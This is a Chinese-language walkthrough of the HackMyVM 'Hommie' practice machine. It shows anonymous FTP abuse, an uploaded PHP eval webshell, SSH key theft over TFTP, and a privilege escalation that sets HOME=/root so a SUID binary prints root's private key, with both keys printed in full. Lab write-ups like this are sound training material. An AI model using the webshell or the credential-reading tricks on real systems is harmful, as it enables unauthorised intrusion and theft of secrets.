# Hommie

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2020-09-30

✔️ MD5 // 5c6915e238e3e0647e1d508522907c74

☠ Root // 225

💀 User // 230

📝Notes //
Enumeration is the KEY. Tested on VirtualBox.

:::

## 靶机启动

![靶机启动](img/image_20231256-225647.png)

靶机 IP：

```plaintext
192.168.56.105
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.105
Host is up (0.00031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 c627ab53abb9c020373652a960d353fc (RSA)
|   256 483b281f9a23da71f6050ba5a6c8b7b0 (ECDSA)
|_  256 b32e7cff622d53dd6397d44772c84e30 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:B6:0D:21 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

可以发现 ftp 服务允许匿名访问，肌肉反应可能存在 ftp 控制 web 服务的目录，进而实现写入 webshell 得权

## 访问 web 服务

```shell
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Hommie]
└──╼ $http get 192.168.56.105
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html
Date: Fri, 22 Dec 2023 15:03:52 GMT
ETag: W/"5f749979-63"
Last-Modified: Wed, 30 Sep 2020 14:43:05 GMT
Server: nginx/1.14.2
Transfer-Encoding: chunked

alexia, Your id_rsa is exposed, please move it!!!!!
Im fighting regarding reverse shells!
-nobody
```

出现两位人物:

```plaintext
alexia
nobody
```

## 利用 ftp 服务匿名登陆

ftp 服务允许匿名访问

```shell
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Hommie]
└──╼ $ftp 192.168.56.105
Connected to 192.168.56.105.
220 (vsFTPd 3.0.3)
Name (192.168.56.105:randark): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

列出所有目录和文件

```shell
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .web
-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
226 Directory send OK.
```

查看 `.web` 目录

```shell
ftp> cd .web
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
-rw-r--r--    1 0        0              99 Sep 30  2020 index.html
226 Directory send OK.
```

并且可以上传 webshell

```shell
ftp> put webshell.php
local: webshell.php remote: webshell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
32 bytes sent in 0.00 secs (459.5588 kB/s)
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    2 0        113          4096 Dec 22 10:17 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
-rw-r--r--    1 0        0              99 Sep 30  2020 index.html
-rw-r--r--    1 106      113            32 Dec 22 10:17 webshell.php
226 Directory send OK.
```

尝试访问 webshell

```shell
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Hommie]
└──╼ $http get 192.168.56.105/webshell.php
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: keep-alive
Content-Length: 32
Content-Type: application/octet-stream
Date: Fri, 22 Dec 2023 15:18:06 GMT
ETag: "6585a881-20"
Last-Modified: Fri, 22 Dec 2023 15:17:21 GMT
Server: nginx/1.14.2

<?php @eval($_POST['shell']) ?>
```

文件可以正常返回，但是服务端并不会解析 php 文件

## 利用 tftp 服务下载 `id_rsa` 并加以利用

下载 `id_rsa` 文件

```plaintext
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Hommie]
└──╼ $tftp 192.168.56.105
tftp> get id_rsa
Received 1850 bytes in 0.0 seconds
```

利用私钥登录 SSH

```shell
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Hommie]
└──╼ $ssh alexia@192.168.56.105 -i id_rsa
Linux hommie 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Dec 22 10:59:52 2023 from 192.168.56.102
alexia@hommie:~$ whoami
alexia
```

## user pwned

```shell
alexia@hommie:~$ cat user.txt
Imnotroot
```

## 尝试提权

```plaintext title="find / -perm -u=s -type f 2>/dev/null"
/opt/showMetheKey
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
```

发现可疑二进制文件：`/opt/showMetheKey`

## 利用 `/opt/showMetheKey`

尝试直接运行

```shell
alexia@hommie:~$ /opt/showMetheKey
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7
V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y
Rn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT
gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j
QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq
kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI
M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM
dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW
rH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B
tIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T
d/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/
+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE
Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w
pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk
WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz
bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu
3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6
0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z
HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs
y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY
OZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08
QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp
ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN
0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

将文件下载到本地进行逆向分析

![/opt/showMetheKey 逆向分析](img/image_20231205-000505.png)

可以发现核心在于这句

```c
system("cat $HOME/.ssh/id_rsa");
```

那么就可以通过控制 `$HOME` 环境变量，来让 `/opt/showMetheKey` 读取 root 账户的 SSH 私钥

```shell
alexia@hommie:/home/alexia$ export HOME=/root
alexia@hommie:/home/alexia$ /opt/showMetheKey
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAvBYog1I3rTTmtMw6i7oPRYy7yj8N6zNT3K9QhalnaTF+Md5NjbX5
hhNfZjO0tNbMGEeJtNTc3FpYWcAujrrd3jO5MzHUWAxQoyYYrZOFj2I5Fz/0RxD7e89H11
5nT7+CSUeddP/UeoyvSPgaruwrwD+dUl7+GiXo3sc5vsq3YufTYh1MlMKb/m7KmVk5n4Tk
/IFJwuuc3U4OZiRwXOmK4W2Gfo0Fonu6vFYmhpcCsi7V8g3hpVmOZIU8ZUtG1YbutCVbOC
EGyc1p5nbnyC0IIF5Y2EhjeevX8gmj4Kdv/y6yuvNdsJKm+ed2EEY9AymmPPwIpQshFwKz
Y0yB8N1jkQAAA8BiCyR9YgskfQAAAAdzc2gtcnNhAAABAQC8FiiDUjetNOa0zDqLug9FjL
vKPw3rM1Pcr1CFqWdpMX4x3k2NtfmGE19mM7S01swYR4m01NzcWlhZwC6Out3eM7kzMdRY
DFCjJhitk4WPYjkXP/RHEPt7z0fXXmdPv4JJR510/9R6jK9I+Bqu7CvAP51SXv4aJejexz
m+yrdi59NiHUyUwpv+bsqZWTmfhOT8gUnC65zdTg5mJHBc6YrhbYZ+jQWie7q8ViaGlwKy
LtXyDeGlWY5khTxlS0bVhu60JVs4IQbJzWnmdufILQggXljYSGN569fyCaPgp2//LrK681
2wkqb553YQRj0DKaY8/AilCyEXArNjTIHw3WORAAAAAwEAAQAAAQA/OvPDshAlmnM0tLO5
5YLczsMS6r+zIj4/InDffmPVaV4TRbisu1B3Umvv39IQOWXDg8k3kZfuPDEXexQrx4Zu/N
R18XqBXyJ8toH1WHK+ETdAKa/ldEAXD0gHjyUMGkWifQDiJF86E7GZxk6yH5NVvg0Vc/nY
sIXo3vD6wwuDo/gj+u4RRYMH3NYkLSj/O67cxGXnTOZPGzGsFTrE218BNtNqbRBR9/immU
irjugqebxY135Z4oECe/Hv4mP2e7n5QVO8FnYklQ4YU6y0ZTAMtjZCAhslXSKvaJPLjXuk
/HpdYhSoojm3vTAq/NT/oir0wA2ZYGdnF/Bxm6v/mntBAAAAgF2pqZEe9UqzcsAfOujr6z
DMRgPpl8qsdhDz6aftdg24AYmgXJ1D7PWUDpU6puO3VxJGrOwvcgD6xELRTxeFjd/2ssrh
4OO/kTvK4K0WVB/bnZ4y724iLcThfHDbzTTc5ckn45tyso8540iKha5ay1i24GwRPWddie
B/qcB1bHNOAAAAgQDmmptuwTRwUSiU1NtZRnJFvxvzLw6Wy/Cb2G+n5KY0ce5cYHT2HSIr
zsbPaDXQNBFy4iu1DAXAJJXTrxjOaAeLVYSb/8eZ1dhcgkxoAC8i2l6NwNmsjhGQKv++fV
qMfIdzVmriLXBZf7DU97YZeDIOrdOOV5CHhq+37i4xNdK18wAAAIEA0Mzc8HYvrXk4ecyi
KXP5u2Zxw2LADJ8DFeKWZmCUuNKFD1TuqdauxKxIVKVDaHvcnEr1bOiEBBso/X1CCtKjE+
12ZOWvqZ4fORxiNs9n/9YxlUSDAw7kyKd9H7dRRFdtb80OgDiwf18tDlEdboGWm/DR0NPq
gmxzbd40GES6DWsAAAALcm9vdEBob21taWU=
-----END OPENSSH PRIVATE KEY-----
```

保存 SSH 私钥到本地，然后尝试登录 root 账户

```shell
┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Hommie]
└──╼ $ssh root@192.168.56.105 -i id_rsa_root
Linux hommie 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 30 11:03:23 2020
root@hommie:~# whoami
root
```

## 寻找 `root.txt`

在 root 的用户目录下，只发现了一个 `note.txt` 文件

```plaintext title="/root/note.txt"
I dont remember where I stored root.txt !!!
```

尝试全盘搜索文件

```shell
root@hommie:/# find / -name "root.txt" 2>/dev/null
/usr/include/root.txt
```

## root pwned

```shell
root@hommie:/# cat /usr/include/root.txt
Imnotbatman
```
